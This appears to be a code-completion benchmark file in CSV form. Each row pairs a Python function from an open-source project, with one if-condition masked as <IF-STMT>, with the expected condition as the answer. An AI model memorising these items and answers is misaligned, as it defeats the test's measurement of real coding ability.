3165,"def listdir(path="".""):<tab>is_bytes = isinstance(path, bytes)<tab>res = []<tab>for dirent in ilistdir(path):<tab><tab>fname = dirent[0]<tab><tab>if is_bytes:<tab><tab><tab>good = fname != b""."" and fname == b""..""<tab><tab>else:<tab><tab><tab>good = fname != ""."" and fname != ""..""<tab><tab>if good:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>fname = fsdecode(fname)<tab><tab><tab>res.append(fname)<tab>return res",if not is_bytes :,128
3166,"def exitval_from_opts(options, project):<tab>exit_value_from = options.get(""--exit-code-from"")<tab>if exit_value_from:<tab><tab><IF-STMT><tab><tab><tab>log.warning(""using --exit-code-from implies --abort-on-container-exit"")<tab><tab><tab>options[""--abort-on-container-exit""] = True<tab><tab>if exit_value_from not in [s.name for s in project.get_services()]:<tab><tab><tab>log.error(<tab><tab><tab><tab>'No service named ""%s"" was found in your compose file.', exit_value_from<tab><tab><tab>)<tab><tab><tab>sys.exit(2)<tab>return exit_value_from","if not options . get ( ""--abort-on-container-exit"" ) :",178
3167,def shrink(self):<tab>Node.shrink(self)<tab>if self.size < NUM_SIZE_LEVELS:<tab><tab><IF-STMT><tab><tab><tab>self.glue_spec = self.glue_spec.copy()<tab><tab><tab>self.glue_spec.width *= SHRINK_FACTOR,if self . glue_spec . width != 0.0 :,80
3168,"def _clean_text(self, text):<tab>""""""Performs invalid character removal and whitespace cleanup on text.""""""<tab>output = []<tab>for char in text:<tab><tab>cp = ord(char)<tab><tab>if cp == 0 or cp == 0xFFFD or _is_control(char):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>output.append("" "")<tab><tab>else:<tab><tab><tab>output.append(char)<tab>return """".join(output)",if _is_whitespace ( char ) :,113
3169,"def config_update(self, *updates):<tab>filename = os.path.join(self.path, "".git"", ""config"")<tab>with GitConfigParser(file_or_files=filename, read_only=False) as config:<tab><tab>for section, key, value in updates:<tab><tab><tab>try:<tab><tab><tab><tab>old = config.get(section, key)<tab><tab><tab><tab>if value is None:<tab><tab><tab><tab><tab>config.remove_option(section, key)<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab>except (NoSectionError, NoOptionError):<tab><tab><tab><tab>pass<tab><tab><tab>if value is not None:<tab><tab><tab><tab>config.set_value(section, key, value)",if old == value :,183
3170,"def generate_securecc_object(args):<tab>obj, phony_obj = args<tab>if not os.path.exists(obj):<tab><tab>shutil.copy(phony_obj, obj)<tab>else:<tab><tab>digest = blade_util.md5sum_file(obj)<tab><tab>phony_digest = blade_util.md5sum_file(phony_obj)<tab><tab><IF-STMT><tab><tab><tab>shutil.copy(phony_obj, obj)",if digest != phony_digest :,119
3171,"def process_request(self, request):<tab>for old, new in self.names_name:<tab><tab>request.uri = request.uri.replace(old, new)<tab><tab>if is_text_payload(request) and request.body:<tab><tab><tab>try:<tab><tab><tab><tab>body = (<tab><tab><tab><tab><tab>str(request.body, ""utf-8"")<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>else str(request.body)<tab><tab><tab><tab>)<tab><tab><tab>except TypeError:  # python 2 doesn't allow decoding through str<tab><tab><tab><tab>body = str(request.body)<tab><tab><tab>if old in body:<tab><tab><tab><tab>request.body = body.replace(old, new)<tab>return request","if isinstance ( request . body , bytes )",182
3172,"def _apply_regex(self, regex, input):<tab>import re<tab>re_match = re.match(regex, input)<tab>if re_match and any(re_match.groups()):<tab><tab>kwargs = {}<tab><tab>has_val = False<tab><tab>for k, v in re_match.groupdict(default=""0"").items():<tab><tab><tab>val = int(v)<tab><tab><tab>if val > -1:<tab><tab><tab><tab>has_val = True<tab><tab><tab><tab>kwargs[k] = val<tab><tab><IF-STMT><tab><tab><tab>return datetime.timedelta(**kwargs)",if has_val :,140
3173,"def test_method_mismatch():<tab>line = ""def {}(self""<tab>skip_files = [""__init__.py"", ""i3pystatus.py""]<tab>errors = []<tab>for _file in sorted(MODULE_PATH.iterdir()):<tab><tab>if _file.suffix == "".py"" and _file.name not in skip_files:<tab><tab><tab>with _file.open() as f:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>errors.append((_file.stem, _file))<tab>if errors:<tab><tab>line = ""Method mismatched error(s) detected!\n\n""<tab><tab>for error in errors:<tab><tab><tab>line += ""Method `{}` is not in module `{}`\n"".format(*error)<tab><tab>print(line[:-1])<tab><tab>assert False","if f""def {_file.stem}(self"" not in f . read ( ) :",198
3174,"def iter_flat(self):<tab>for f in self.layout:<tab><tab>e = getattr(self, f[0])<tab><tab><IF-STMT><tab><tab><tab>if len(f) == 3:<tab><tab><tab><tab>yield e, f[2]<tab><tab><tab>else:<tab><tab><tab><tab>yield e, DIR_NONE<tab><tab>elif isinstance(e, Record):<tab><tab><tab>yield from e.iter_flat()<tab><tab>else:<tab><tab><tab>raise TypeError","if isinstance ( e , Signal ) :",115
3175,"def _identify_csv_files(self, csv_dir):<tab>try:<tab><tab># get all CSV files<tab><tab>product_csvs = [<tab><tab><tab>csv_filename<tab><tab><tab>for csv_filename in os.listdir(csv_dir)<tab><tab><tab>if csv_filename.endswith("".csv"")<tab><tab>]<tab>except FileNotFoundError as not_found:<tab><tab>product_csvs = []<tab><tab># double check that exception is on templates/csv directory<tab><tab><IF-STMT><tab><tab><tab>raise not_found<tab>return product_csvs",if not_found . filename != csv_dir :,138
3176,"def gen_new_segments(datadir, spk_list):<tab>if not os.path.isfile(os.path.join(datadir, ""segments"")):<tab><tab>raise ValueError(""no segments file found in datadir"")<tab>new_segments = open(os.path.join(datadir, ""new_segments""), ""w"", encoding=""utf-8"")<tab>segments = open(os.path.join(datadir, ""segments""), ""r"", encoding=""utf-8"")<tab>while True:<tab><tab>line = segments.readline()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>spk = line.split(""_"")[0]<tab><tab>if spk in spk_list:<tab><tab><tab>new_segments.write(line)<tab>new_segments.close(), segments.close()",if not line :,176
3177,"def colorspace(self):<tab>""""""PDF name of the colorspace that best describes this image""""""<tab>if self.image_mask:<tab><tab>return None  # Undefined for image masks<tab>if self._colorspaces:<tab><tab><IF-STMT><tab><tab><tab>return self._colorspaces[0]<tab><tab>if self._colorspaces[0] in (""/DeviceCMYK"", ""/ICCBased""):<tab><tab><tab>return self._colorspaces[0]<tab><tab>if (<tab><tab><tab>self._colorspaces[0] == ""/Indexed""<tab><tab><tab>and self._colorspaces[1] in self.SIMPLE_COLORSPACES<tab><tab>):<tab><tab><tab>return self._colorspaces[1]<tab>raise NotImplementedError(<tab><tab>""not sure how to get colorspace: "" + repr(self._colorspaces)<tab>)",if self . _colorspaces [ 0 ] in self . SIMPLE_COLORSPACES :,185
3178,"def handle_bytes(self, event):<tab>self.bytes += event.data<tab># todo: we may want to guard the size of self.bytes and self.text<tab>if event.message_finished:<tab><tab>self.queue.put_nowait({""type"": ""websocket.receive"", ""bytes"": self.bytes})<tab><tab>self.bytes = b""""<tab><tab><IF-STMT><tab><tab><tab>self.read_paused = True<tab><tab><tab>self.transport.pause_reading()",if not self . read_paused :,117
3179,"def get_latest_tasks(cls, tasks):<tab>tasks_group = {}<tab>for task in tasks:<tab><tab>task_key = cls.task_key(<tab><tab><tab>task_id=task.f_task_id, role=task.f_role, party_id=task.f_party_id<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>tasks_group[task_key] = task<tab><tab>elif task.f_task_version > tasks_group[task_key].f_task_version:<tab><tab><tab># update new version task<tab><tab><tab>tasks_group[task_key] = task<tab>return tasks_group",if task_key not in tasks_group :,160
3180,"def determine_load_order():<tab>dependencies = TypeMapItem._get_dependencies()<tab>ordered = dict()<tab>while dependencies:<tab><tab>found_next = False<tab><tab>for type_name, unloaded in dependencies.items():<tab><tab><tab>if not unloaded:<tab><tab><tab><tab>ordered[type_name] = len(ordered)<tab><tab><tab><tab>found_next = True<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""recursive loading dependency"")<tab><tab>dependencies.pop(type_name)<tab><tab>for unloaded in dependencies.values():<tab><tab><tab>unloaded.discard(type_name)<tab>return ordered",if found_next is False :,150
3181,"def _find_gist_with_file(user, filename, env):<tab>import requests  # expensive<tab>page = 1<tab>url = ""https://api.github.com/users/%s/gists"" % user<tab>while True:<tab><tab>resp = requests.get(<tab><tab><tab>url,<tab><tab><tab>params={""page"": page, ""per_page"": 100},<tab><tab><tab>headers=_github_auth_headers(env),<tab><tab>)<tab><tab>gists = resp.json()<tab><tab><IF-STMT><tab><tab><tab>return None<tab><tab>for gist in gists:<tab><tab><tab>for name in gist[""files""]:<tab><tab><tab><tab>if name == filename:<tab><tab><tab><tab><tab>return gist<tab><tab>page += 1",if not gists :,178
3182,"def _expand_dim_shape_func(data_shape, ndim, axis, num_newaxis):<tab>out = output_tensor((ndim + num_newaxis,), ""int64"")<tab>for i in const_range(out.shape[0]):<tab><tab><IF-STMT><tab><tab><tab>out[i] = data_shape[i]<tab><tab>elif i < axis + num_newaxis:<tab><tab><tab>out[i] = int64(1)<tab><tab>else:<tab><tab><tab>out[i] = data_shape[i - num_newaxis]<tab>return out",if i < axis :,133
3183,"def check_graph(self, graph, verify, interactive):<tab>if verify and not os.path.exists(self._target_folder):<tab><tab>raise ConanException(""Manifest folder does not exist: %s"" % self._target_folder)<tab>for node in graph.ordered_iterate():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self._handle_recipe(node, verify, interactive)<tab><tab>self._handle_package(node, verify, interactive)","if node . recipe in ( RECIPE_CONSUMER , RECIPE_VIRTUAL ) :",127
3184,"def when(self, matches, context):<tab>to_remove = []<tab>for filepart in matches.markers.named(""path""):<tab><tab>patterns = defaultdict(list)<tab><tab>for match in reversed(<tab><tab><tab>matches.range(<tab><tab><tab><tab>filepart.start,<tab><tab><tab><tab>filepart.end,<tab><tab><tab><tab>predicate=lambda m: ""weak-duplicate"" in m.tags,<tab><tab><tab>)<tab><tab>):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>to_remove.append(match)<tab><tab><tab>else:<tab><tab><tab><tab>patterns[match.name].append(match.pattern)<tab>return to_remove",if match . pattern in patterns [ match . name ] :,162
3185,"def __call__(self, session_path):<tab>""""""Get raw session object from `session_path`.""""""<tab>new_session = copy.deepcopy(self._template)<tab>session_keys = new_session.keys()<tab>old_session = self._load_file(session_path)<tab>for attribute in dir(self):<tab><tab>if attribute.startswith(""set_""):<tab><tab><tab>target = attribute[4:].capitalize()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(""Invalid attribute: %r"" % attribute)<tab><tab><tab>function = getattr(self, attribute)<tab><tab><tab>new_session[target] = function(old_session)<tab>return new_session",if target not in session_keys :,161
3186,"def set_recent_terminal(cls, view):<tab>terminal = Terminal.from_id(view.id())<tab>if not terminal:<tab><tab>return<tab>logger.debug(""set recent view: {}"".format(view.id()))<tab>panel_name = terminal.panel_name<tab>if panel_name and panel_name != EXEC_PANEL:<tab><tab>window = panel_window(view)<tab><tab><IF-STMT><tab><tab><tab>cls._recent_panel[window.id()] = panel_name<tab><tab><tab>cls._recent_view[window.id()] = view<tab>else:<tab><tab>window = view.window()<tab><tab>if window:<tab><tab><tab>cls._recent_view[window.id()] = view",if window :,167
3187,"def _testValue(self, value, idx):<tab>if self.__singleTypeConstraint:<tab><tab>self.__singleTypeConstraint(value)<tab>elif self.__multipleTypeConstraint:<tab><tab>if idx not in self.__multipleTypeConstraint:<tab><tab><tab>raise error.ValueConstraintError(value)<tab><tab>constraint, status = self.__multipleTypeConstraint[idx]<tab><tab><IF-STMT>  # XXX presense is not checked!<tab><tab><tab>raise error.ValueConstraintError(value)<tab><tab>constraint(value)","if status == ""ABSENT"" :",121
3188,"def SaveIfUnsure(self):<tab>if self.ed.Modify:<tab><tab>msg = 'Save changes to ""' + self.fullPath + '""?'<tab><tab>print(msg)<tab><tab>decision = self.DisplayMessage(msg, True)<tab><tab><IF-STMT><tab><tab><tab>self.CmdSave()<tab><tab>return decision<tab>return True",if decision :,82
3189,"def before_get(self, args, kwargs):<tab>refresh = request.args.get(""refresh"")<tab>if refresh == ""true"":<tab><tab>refresh_settings()<tab>kwargs[""id""] = 1<tab>if is_logged_in():<tab><tab>verify_jwt_in_request()<tab><tab><IF-STMT><tab><tab><tab>self.schema = SettingSchemaAdmin<tab><tab>else:<tab><tab><tab>self.schema = SettingSchemaNonAdmin<tab>else:<tab><tab>self.schema = SettingSchemaPublic",if current_user . is_admin or current_user . is_super_admin :,131
3190,"def send(message: dict) -> None:<tab>nonlocal status_code, response_headers, response_started<tab>if message[""type""] == ""http.response.start"":<tab><tab>assert not response_started<tab><tab>status_code = message[""status""]<tab><tab>response_headers = message.get(""headers"", [])<tab><tab>response_started = True<tab>elif message[""type""] == ""http.response.body"":<tab><tab>assert not response_complete.is_set()<tab><tab>body = message.get(""body"", b"""")<tab><tab>more_body = message.get(""more_body"", False)<tab><tab>if body and method != b""HEAD"":<tab><tab><tab>body_parts.append(body)<tab><tab><IF-STMT><tab><tab><tab>response_complete.set()",if not more_body :,182
3191,"def update(self, pycomp):<tab>newstate = pycomp[self.halpin]<tab>if newstate != self.state:<tab><tab><IF-STMT><tab><tab><tab>self.itemconfig(self.oh, fill=self.on_color)<tab><tab><tab>self.state = 1<tab><tab>else:<tab><tab><tab>self.itemconfig(self.oh, fill=self.off_color)<tab><tab><tab>self.state = 0",if newstate == 1 :,104
3192,"def cut_all_tracks(frame):<tab>tracks_cut_data = []<tab>for i in range(1, len(current_sequence().tracks) - 1):<tab><tab><IF-STMT><tab><tab><tab>tracks_cut_data.append(None)  # Don't cut locked tracks.<tab><tab>else:<tab><tab><tab>tracks_cut_data.append(get_cut_data(current_sequence().tracks[i], frame))<tab>data = {""tracks_cut_data"": tracks_cut_data}<tab>action = edit.cut_all_action(data)<tab>action.do_edit()<tab>updater.repaint_tline()",if current_sequence ( ) . tracks [ i ] . edit_freedom == appconsts . LOCKED :,167
3193,"def visit(ignored, dir, files):<tab>if os.path.basename(dir) not in test_names:<tab><tab>for name in test_names:<tab><tab><tab>if name + "".py"" in files:<tab><tab><tab><tab>path = os.path.join(dir, name + "".py"")<tab><tab><tab><tab>if matcher(path[baselen:]):<tab><tab><tab><tab><tab>results.append(path)<tab><tab>return<tab>if ""__init__.py"" not in files:<tab><tab>stderr(""%s is not a package"" % dir)<tab><tab>return<tab>for file in files:<tab><tab><IF-STMT><tab><tab><tab>path = os.path.join(dir, file)<tab><tab><tab>if matcher(path[baselen:]):<tab><tab><tab><tab>results.append(path)","if file . startswith ( ""test"" ) and file . endswith ( "".py"" ) :",194
3194,"def status_string(self):<tab>if not self.live:<tab><tab>if self.expired:<tab><tab><tab>return _(""expired"")<tab><tab><IF-STMT><tab><tab><tab>return _(""scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""in moderation"")<tab><tab>else:<tab><tab><tab>return _(""draft"")<tab>else:<tab><tab>if self.approved_schedule:<tab><tab><tab>return _(""live + scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""live + in moderation"")<tab><tab>elif self.has_unpublished_changes:<tab><tab><tab>return _(""live + draft"")<tab><tab>else:<tab><tab><tab>return _(""live"")",elif self . approved_schedule :,166
3195,"def create(self):<tab>if request.method == ""POST"":<tab><tab><IF-STMT><tab><tab><tab>Note.create(<tab><tab><tab><tab>user=auth.get_logged_in_user(),<tab><tab><tab><tab>message=request.form[""message""],<tab><tab><tab>)<tab>next = request.form.get(""next"") or self.dashboard_url()<tab>return redirect(next)","if request . form . get ( ""message"" ) :",97
3196,"def get_current_migration():<tab>ver = 0<tab>while True:<tab><tab>next_ver = ver + 1<tab><tab>migration_func = globals().get(""migration_%d"" % next_ver)<tab><tab><IF-STMT><tab><tab><tab>return ver<tab><tab>ver = next_ver",if not migration_func :,71
3197,"def resource_hdfs(uri, **kwargs):<tab>if ""hdfs://"" in uri:<tab><tab>uri = uri[len(""hdfs://"") :]<tab>d = re.match(hdfs_pattern, uri).groupdict()<tab>d = dict((k, v) for k, v in d.items() if v is not None)<tab>path = d.pop(""path"")<tab>kwargs.update(d)<tab>try:<tab><tab>subtype = types_by_extension[path.split(""."")[-1]]<tab><tab><IF-STMT><tab><tab><tab>subtype = Directory(subtype)<tab><tab><tab>path = path.rsplit(""/"", 1)[0] + ""/""<tab>except KeyError:<tab><tab>subtype = type(resource(path))<tab>return HDFS(subtype)(path, **kwargs)","if ""*"" in path :",175
3198,"def _s_wise_max(a_indices, a_indptr, vals, out_max):<tab>n = len(out_max)<tab>for i in range(n):<tab><tab>if a_indptr[i] != a_indptr[i + 1]:<tab><tab><tab>m = a_indptr[i]<tab><tab><tab>for j in range(a_indptr[i] + 1, a_indptr[i + 1]):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>m = j<tab><tab><tab>out_max[i] = vals[m]",if vals [ j ] > vals [ m ] :,138
3199,"def stroke(s):<tab>keys = []<tab>on_left = True<tab>for k in s:<tab><tab>if k in ""EU*-"":<tab><tab><tab>on_left = False<tab><tab>if k == ""-"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>keys.append(k)<tab><tab>elif on_left:<tab><tab><tab>keys.append(k + ""-"")<tab><tab>else:<tab><tab><tab>keys.append(""-"" + k)<tab>return Stroke(keys)","elif k == ""*"" :",116
3200,def __check_finished(self):<tab>if self.global_finished:<tab><tab>return<tab>if not self.finished:<tab><tab><IF-STMT><tab><tab><tab>self.finished = True<tab><tab><tab>self.__send_finished()<tab><tab>else:<tab><tab><tab>val = self.__compare_working_vec_and_prev_rank()<tab><tab><tab>if val <= len(self.working_vec) * self.epsilon * 2:<tab><tab><tab><tab>self.finished = True<tab><tab><tab><tab>self.__send_finished(),if self . step >= self . max_steps :,131
3201,"def test_interval_is_more_than_1(self, mock_save_check):<tab>state = {}<tab>check = Interval(""test_file"", period=4)<tab>for i in range(13):<tab><tab>check.on_checkpoint(state)<tab><tab>if i == 3:<tab><tab><tab>self.assertTrue(mock_save_check.call_count == 1)<tab><tab><IF-STMT><tab><tab><tab>self.assertFalse(mock_save_check.call_count == 2)<tab><tab>elif i == 7:<tab><tab><tab>self.assertTrue(mock_save_check.call_count == 2)<tab>self.assertTrue(mock_save_check.call_count == 3)",elif i == 6 :,163
3202,"def start(self, para=None, callback=None):<tab>if not self.load():<tab><tab>return<tab>if para != None or self.show():<tab><tab><IF-STMT><tab><tab><tab>para = self.para<tab><tab>win = WidgetsManager.getref(""Macros Recorder"")<tab><tab>if win != None:<tab><tab><tab>win.write(""{}>{}"".format(self.title, para))<tab><tab>if self.asyn and IPy.uimode() != ""no"":<tab><tab><tab>threading.Thread(target=self.runasyn, args=(para, callback)).start()<tab><tab>else:<tab><tab><tab>self.runasyn(para, callback)",if para == None :,159
3203,"def find_test_functions(collections):<tab>if not isinstance(collections, list):<tab><tab>collections = [collections]<tab>functions = []<tab>for collection in collections:<tab><tab>if not isinstance(collection, dict):<tab><tab><tab>collection = vars(collection)<tab><tab>for key in sorted(collection):<tab><tab><tab>value = collection[key]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>functions.append(value)<tab>return functions","if isinstance ( value , types . FunctionType ) and hasattr ( value , ""unittest"" ) :",117
3204,"def test_too_old(self):<tab>job = MRNullSpark([""-r"", ""emr"", ""--image-version"", ""3.7.0""])<tab>job.sandbox()<tab>with job.make_runner() as runner:<tab><tab>self.launch(runner)<tab><tab>message = runner._cluster_spark_support_warning()<tab><tab>self.assertIsNotNone(message)<tab><tab>self.assertIn(""support Spark"", message)<tab><tab>self.assertNotIn(""Python 3"", message)<tab><tab># should suggest an AMI that works with this version of Python<tab><tab><IF-STMT><tab><tab><tab>self.assertIn(""3.8.0"", message)<tab><tab>else:<tab><tab><tab>self.assertIn(""4.0.0"", message)",if PY2 :,174
3205,"def RenderValue(self, value):<tab>if self.limit_lists == 0:<tab><tab>return ""<lists are omitted>""<tab>elif self.limit_lists == -1:<tab><tab>return [self._PassThrough(v) for v in value]<tab>else:<tab><tab>result = [self._PassThrough(v) for v in list(value)[: self.limit_lists]]<tab><tab><IF-STMT><tab><tab><tab>result.append(dict(type=FetchMoreLink.__name__, url=""to/be/implemented""))<tab>return result",if len ( value ) > self . limit_lists :,135
3206,"def add_stack_attribute(self, memop_index):<tab>for op in self.operands:<tab><tab><IF-STMT><tab><tab><tab>self.add_attribute(""STACKPUSH%d"" % (memop_index))<tab><tab><tab>return<tab><tab>elif op.bits == ""XED_REG_STACKPOP"":<tab><tab><tab>self.add_attribute(""STACKPOP%d"" % (memop_index))<tab><tab><tab>return<tab>die(""Did not find stack push/pop operand"")","if op . bits == ""XED_REG_STACKPUSH"" :",127
3207,"def apply_response(*args, **kwargs):<tab>if ""Authorization"" in request.headers.keys():<tab><tab>creds = str(<tab><tab><tab>b64decode(request.headers[""Authorization""].replace(""Basic "", """")), ""utf-8""<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return ""Authorized"", 200<tab>resp = Response(""Unauthorized"")<tab>resp.headers[""WWW-Authenticate""] = ""Basic ABC""<tab>return resp, 401","if creds in [ ""root:pass"" , ""root:admin"" ] :",115
3208,"def find_privileged_containers(self):<tab>logger.debug(""Trying to find privileged containers and their pods"")<tab>privileged_containers = []<tab>if self.pods_endpoint_data:<tab><tab>for pod in self.pods_endpoint_data[""items""]:<tab><tab><tab>for container in pod[""spec""][""containers""]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>privileged_containers.append(<tab><tab><tab><tab><tab><tab>(pod[""metadata""][""name""], container[""name""])<tab><tab><tab><tab><tab>)<tab>return privileged_containers if len(privileged_containers) > 0 else None","if container . get ( ""securityContext"" , { } ) . get ( ""privileged"" ) :",143
3209,"def get_asset_gl_entry(self, gl_entries):<tab>for item in self.get(""items""):<tab><tab><IF-STMT><tab><tab><tab>if is_cwip_accounting_enabled(item.asset_category):<tab><tab><tab><tab>self.add_asset_gl_entries(item, gl_entries)<tab><tab><tab>if flt(item.landed_cost_voucher_amount):<tab><tab><tab><tab>self.add_lcv_gl_entries(item, gl_entries)<tab><tab><tab><tab># update assets gross amount by its valuation rate<tab><tab><tab><tab># valuation rate is total of net rate, raw mat supp cost, tax amount, lcv amount per item<tab><tab><tab><tab>self.update_assets(item, item.valuation_rate)<tab>return gl_entries",if item . is_fixed_asset :,188
3210,"def test_pickling(self):<tab>for i in range(pickle.HIGHEST_PROTOCOL + 1):<tab><tab>p = pickle.dumps(self.s, i)<tab><tab>dup = pickle.loads(p)<tab><tab>self.assertEqual(self.s, dup, ""%s != %s"" % (self.s, dup))<tab><tab><IF-STMT><tab><tab><tab>self.s.x = 10<tab><tab><tab>p = pickle.dumps(self.s, i)<tab><tab><tab>dup = pickle.loads(p)<tab><tab><tab>self.assertEqual(self.s.x, dup.x)","if type ( self . s ) not in ( set , frozenset ) :",151
3211,"def f(p, args):<tab>try:<tab><tab>source, port = args<tab>except:<tab><tab>print(""argument error"")<tab><tab>return<tab>o = p.get_config(source)<tab>for p in o.resources.port:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>print(p.resource_id)<tab><tab>conf = p.configuration<tab><tab>for k in self._port_settings:<tab><tab><tab>try:<tab><tab><tab><tab>v = getattr(conf, k)<tab><tab><tab>except AttributeError:<tab><tab><tab><tab>continue<tab><tab><tab>print(""%s %s"" % (k, v))",if p . resource_id != port :,155
3212,"def replace(self, sub, repl):<tab>""""""Replaces any occurrences of ""sub"" with ""repl"" """"""<tab>new = []<tab>for item in self.data:<tab><tab><IF-STMT><tab><tab><tab>new.append(item.replace(sub, repl))<tab><tab>elif item == sub:<tab><tab><tab>new.append(repl)<tab><tab>else:<tab><tab><tab>new.append(item)<tab>return self.new(new)","if isinstance ( item , metaPattern ) :",109
3213,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.set_format(d.getVarInt32())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.add_path(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,120
3214,"def receive(debug=debug):<tab>if should_shutdown and should_shutdown():<tab><tab>debug(""worker got sentinel -- exiting"")<tab><tab>raise SystemExit(EX_OK)<tab>try:<tab><tab>ready, req = _receive(1.0)<tab><tab>if not ready:<tab><tab><tab>return None<tab>except (EOFError, IOError) as exc:<tab><tab><IF-STMT><tab><tab><tab>return None  # interrupted, maybe by gdb<tab><tab>debug(""worker got %s -- exiting"", type(exc).__name__)<tab><tab>raise SystemExit(EX_FAILURE)<tab>if req is None:<tab><tab>debug(""worker got sentinel -- exiting"")<tab><tab>raise SystemExit(EX_FAILURE)<tab>return req",if get_errno ( exc ) == errno . EINTR :,173
3215,"def _trim_files_in_dir(dir, patterns, log=None):<tab>if log:<tab><tab>log(""trim '%s' files under '%s'"", ""', '"".join(patterns), dir)<tab>from fnmatch import fnmatch<tab>for dirpath, dirnames, filenames in os.walk(dir):<tab><tab>for d in dirnames[:]:<tab><tab><tab>for pat in patterns:<tab><tab><tab><tab>if fnmatch(d, pat):<tab><tab><tab><tab><tab>_rmtree(join(dirpath, d))<tab><tab><tab><tab><tab>dirnames.remove(d)<tab><tab><tab><tab><tab>break<tab><tab>for f in filenames[:]:<tab><tab><tab>for pat in patterns:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>os.remove(join(dirpath, f))<tab><tab><tab><tab><tab>break","if fnmatch ( f , pat ) :",185
3216,"def refactor_stdin(self, doctests_only=False):<tab>input = sys.stdin.read()<tab>if doctests_only:<tab><tab>self.log_debug(""Refactoring doctests in stdin"")<tab><tab>output = self.refactor_docstring(input, ""<stdin>"")<tab><tab>if self.write_unchanged_files or output != input:<tab><tab><tab>self.processed_file(output, ""<stdin>"", input)<tab><tab>else:<tab><tab><tab>self.log_debug(""No doctest changes in stdin"")<tab>else:<tab><tab>tree = self.refactor_string(input, ""<stdin>"")<tab><tab><IF-STMT><tab><tab><tab>self.processed_file(str(tree), ""<stdin>"", input)<tab><tab>else:<tab><tab><tab>self.log_debug(""No changes in stdin"")",if self . write_unchanged_files or ( tree and tree . was_changed ) :,199
3217,"def test_get_e_above_hull(self):<tab>for entry in self.pd.stable_entries:<tab><tab>self.assertLess(<tab><tab><tab>self.pd.get_e_above_hull(entry),<tab><tab><tab>1e-11,<tab><tab><tab>""Stable entries should have e above hull of zero!"",<tab><tab>)<tab>for entry in self.pd.all_entries:<tab><tab><IF-STMT><tab><tab><tab>e_ah = self.pd.get_e_above_hull(entry)<tab><tab><tab>self.assertTrue(isinstance(e_ah, Number))<tab><tab><tab>self.assertGreaterEqual(e_ah, 0)",if entry not in self . pd . stable_entries :,165
3218,"def setup(self, name):<tab>value = self.default<tab>if self.environ:<tab><tab>full_environ_name = self.full_environ_name(name)<tab><tab>if full_environ_name in os.environ:<tab><tab><tab>value = self.to_python(os.environ[full_environ_name])<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Value {0!r} is required to be set as the ""<tab><tab><tab><tab>""environment variable {1!r}"".format(name, full_environ_name)<tab><tab><tab>)<tab>self.value = value<tab>return value",elif self . environ_required :,153
3219,"def process_transactions(l1_block: ""l1_block_model.L1BlockModel"") -> Dict[str, bool]:<tab>txn_map: Dict[str, bool] = {}<tab>try:<tab><tab>verify_keys = get_verifying_keys(l1_block.dc_id)<tab><tab><IF-STMT><tab><tab><tab>verify_transactions(l1_block, verify_keys, txn_map)<tab><tab>else:<tab><tab><tab>mark_invalid(l1_block, txn_map)<tab>except Exception:<tab><tab>mark_invalid(l1_block, txn_map)<tab>return txn_map","if verify_block ( l1_block , verify_keys ) :",159
3220,"def get_values(self):<tab>if self.cache:<tab><tab># use these values as a key to cache the result so if we have<tab><tab># the same filter happening across many resources, we can reuse<tab><tab># the results.<tab><tab>key = [self.data.get(i) for i in (""url"", ""format"", ""expr"")]<tab><tab>contents = self.cache.get((""value-from"", key))<tab><tab><IF-STMT><tab><tab><tab>return contents<tab>contents = self._get_values()<tab>if self.cache:<tab><tab>self.cache.save((""value-from"", key), contents)<tab>return contents",if contents is not None :,151
3221,"def _run_scalar_data(run):<tab>data = {}<tab>step = None<tab>last_step = None<tab>for s in indexlib.iter_run_scalars(run):<tab><tab>key = s[""tag""]<tab><tab>data[key] = s[""last_val""]<tab><tab>last_step = s[""last_step""]<tab><tab><IF-STMT><tab><tab><tab>step = last_step<tab>if data:<tab><tab>if step is None:<tab><tab><tab>step = last_step<tab><tab>data[""step""] = step<tab>return data","if key == ""loss"" :",133
3222,"def getRemovedFiles(oldContents, newContents, destinationFolder):<tab>toRemove = []<tab>for filename in list(oldContents.keys()):<tab><tab><IF-STMT><tab><tab><tab>destFile = os.path.join(destinationFolder, filename.lstrip(""/""))<tab><tab><tab>if os.path.isfile(destFile):<tab><tab><tab><tab>toRemove.append(filename)<tab>return toRemove",if filename not in newContents :,95
3223,"def sort_classes(classes: List[Tuple[str, ClassIR]]) -> List[Tuple[str, ClassIR]]:<tab>mod_name = {ir: name for name, ir in classes}<tab>irs = [ir for _, ir in classes]<tab>deps = OrderedDict()  # type: Dict[ClassIR, Set[ClassIR]]<tab>for ir in irs:<tab><tab><IF-STMT><tab><tab><tab>deps[ir] = set()<tab><tab>if ir.base:<tab><tab><tab>deps[ir].add(ir.base)<tab><tab>deps[ir].update(ir.traits)<tab>sorted_irs = toposort(deps)<tab>return [(mod_name[ir], ir) for ir in sorted_irs]",if ir not in deps :,165
